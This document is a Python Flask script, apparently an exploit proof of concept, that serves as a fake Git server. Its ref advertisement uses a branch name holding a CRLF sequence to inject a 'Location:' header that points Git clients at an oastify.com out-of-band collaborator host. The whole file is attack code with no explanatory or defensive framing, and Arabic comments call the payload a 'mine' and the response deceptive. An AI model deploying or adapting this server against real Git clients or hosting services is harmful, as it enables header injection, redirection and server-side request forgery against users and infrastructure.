from flask import Flask, request, Response

# --- تم تحديث وجهتك النهائية هنا ---
FINAL_DESTINATION = "http://3swpun8yod6t9v8qiog33smzpqvhjg75.oastify.com"
# ------------------------------------

app = Flask(__name__ )

# "اللغم" الذي يحاول حقن هيدر إعادة التوجيه
MALICIOUS_BRANCH_NAME = f"refs/heads/master\r\nLocation: {FINAL_DESTINATION}"

# دالة لبناء استجابة Git خادعة
def build_git_response(service, branch_name):
    line1 = f"# service={service}\n"
    line2 = "0000"
    ref_line = f"0000000000000000000000000000000000000000 {branch_name}\n"
    
    pkt_line1 = f"{len(line1) + 4:04x}{line1}"
    pkt_ref_line = f"{len(ref_line) + 4:04x}{ref_line}"
    
    full_response = pkt_line1 + line2 + pkt_ref_line + "0000"
    return full_response

@app.route('/info/refs')
def handle_info_refs():
    service = request.args.get('service')
    if service == 'git-upload-pack':
        print("Git client connected! Serving malicious advertisement...")
        
        git_response_data = build_git_response(service, MALICIOUS_BRANCH_NAME)
        
        return Response(
            git_response_data,
            mimetype=f"application/x-{service}-advertisement"
        )
    else:
        return "Service not supported", 404

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    print(f"Generic request received for path: /{path}. Ignoring.")
    return "This is a fake Git server.", 200


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)

